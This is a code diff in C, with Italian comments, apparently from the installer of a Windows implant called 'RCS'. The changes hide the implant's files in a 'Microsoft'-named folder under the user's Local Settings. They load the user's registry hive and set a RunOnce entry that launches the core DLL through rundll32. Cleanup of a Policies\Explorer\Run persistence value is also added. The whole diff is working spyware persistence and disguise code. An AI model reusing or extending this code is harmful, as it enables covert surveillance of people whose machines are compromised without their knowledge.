@@ -9,8 +9,10 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	HANDLE hFind;
 	WIN32_FIND_DATA file_info;
 
-	// Crea la directory
-	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);
+	// Crea la directory nuova
+	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft", user_info->user_home, user_info->user_local_settings);
+	CreateDirectory(tmp_path, NULL);
+	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
 	ClearAttributes(tmp_path);
 	if (!CreateDirectory(tmp_path, NULL) && (GetLastError()!=ERROR_ALREADY_EXISTS)) 
 		return FALSE;
@@ -25,7 +27,7 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 				continue;
 
 			swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\%s", rcs_info->rcs_files_path, file_info.cFileName);
-			swprintf_s(tmp_path2, MAX_PATH, L"%s%s\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->hdir, file_info.cFileName);
+			swprintf_s(tmp_path2, MAX_PATH, L"%s%s\\Microsoft\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir, file_info.cFileName);
 			ClearAttributes(tmp_path2);
 			if (!CopyFile(tmp_path, tmp_path2, FALSE)) {
 				FindClose(hFind);
@@ -46,7 +48,7 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	if (RegLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\", tmp_path) != ERROR_SUCCESS) 
 		return FALSE;
 
-	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%%SystemRoot%%\\system32\\rundll32.exe \"%%USERPROFILE%%%s\\%s\\%s\",%s8", user_info->user_local_settings, rcs_info->hdir, rcs_info->hcore, rcs_info->func_name);
+	swprintf_s(tmp_path, sizeof(tmp_path)/sizeof(tmp_path[0]), L"%%SystemRoot%%\\system32\\rundll32.exe \"%%USERPROFILE%%%s\\Microsoft\\%s\\%s\",%s8", user_info->user_local_settings, rcs_info->new_hdir, rcs_info->hcore, rcs_info->func_name);
 	if (RegSetKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", rcs_info->hreg, REG_EXPAND_SZ, tmp_path, (wcslen(tmp_path)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
 		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
 		return FALSE;
@@ -64,27 +66,28 @@ BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 	HANDLE hFind;
 	WIN32_FIND_DATA file_info;
 	BOOL ret_val = TRUE;
-	HRESULT reg_ret1, reg_ret2;
+	HRESULT reg_ret1, reg_ret2, reg_ret3;
 
 	// Cancella tutti i file (nuova e vecchia directory)
-	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s\\*.*", user_info->user_home, user_info->user_temp, rcs_info->hdir);
+	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s\\*.*", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
 	hFind = FindFirstFile(tmp_path, &file_info);
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			// Salta le directory (es: ".", ".." etc...)
 			if (file_info.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 				continue;
-			swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s\\%s", user_info->user_home, user_info->user_temp, rcs_info->hdir, file_info.cFileName);
+			swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir, file_info.cFileName);
 			ClearAttributes(tmp_path);
 			DeleteFile(tmp_path);
 		} while (FindNextFile(hFind, &file_info));
 		FindClose(hFind);
 		// Cancella la directory
-		swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s", user_info->user_home, user_info->user_temp, rcs_info->hdir);
+		swprintf_s(tmp_path, MAX_PATH, L"%s%s\\Microsoft\\%s", user_info->user_home, user_info->user_local_settings, rcs_info->new_hdir);
 		ClearAttributes(tmp_path);
 		if (!RemoveDirectory(tmp_path))
 			ret_val = FALSE;
 	}
+
 	swprintf_s(tmp_path, MAX_PATH, L"%s%s\\%s\\*.*", user_info->user_home, user_info->user_local_settings, rcs_info->hdir);
 	hFind = FindFirstFile(tmp_path, &file_info);
 	if (hFind != INVALID_HANDLE_VALUE) {
@@ -111,7 +114,8 @@ BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 
 	reg_ret1 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", rcs_info->hreg);
 	reg_ret2 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", rcs_info->hreg);
-	if ( reg_ret1!=ERROR_SUCCESS && reg_ret2!=ERROR_SUCCESS ) {
+	reg_ret3 = RegDeleteKeyValue(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", rcs_info->new_hreg);
+	if ( reg_ret1!=ERROR_SUCCESS && reg_ret2!=ERROR_SUCCESS && reg_ret3!=ERROR_SUCCESS) {
 		RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_NTUSER\\");
 		return FALSE;
 	}
@@ -246,7 +250,8 @@ BOOL WIN_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_str
 void WIN_GetSourceFileDirectory(users_struct_t *curr_user, rcs_struct_t *rcs_info, WCHAR *src_path)
 {
 	HANDLE hfile;
-	swprintf_s(src_path, MAX_PATH, L"%s%s\\%s", curr_user->user_home, curr_user->user_temp, rcs_info->hdir);
+	// Da' la preferenza al nuovo path
+	swprintf_s(src_path, MAX_PATH, L"%s%s\\Microsoft\\%s", curr_user->user_home, curr_user->user_local_settings, rcs_info->new_hdir);
 	hfile = CreateFile(src_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		CloseHandle(hfile);
